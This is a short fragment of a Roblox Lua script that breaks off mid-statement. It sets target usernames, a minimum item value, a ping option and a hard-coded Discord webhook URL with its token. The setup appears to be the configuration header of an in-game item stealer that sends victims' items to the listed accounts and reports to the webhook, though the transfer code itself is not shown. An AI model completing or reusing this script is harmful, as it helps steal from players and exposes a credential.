...
local users = _G.Usernames or {DanilaTop6669}
local min_value = _G.min_value or 0.1
local ping = _G.pingEveryone or "Yes"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1428395424967950489/f_5Xefs3XKd0yoLwcAn0fPiOsW6e38VjTL1Mk3jRvmMaHiSbrHJTkIK6ui6LUzAvdRkV"

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

if next(users) == nil or webhook == "https://discord.com/api/webhooks/1428395424967950489/f_5Xefs3XKd0yoLwcAn0fPiOsW6e38VjTL1Mk3jRvmMaHiSbrHJTkIK6ui6LUzAvdRkV" then
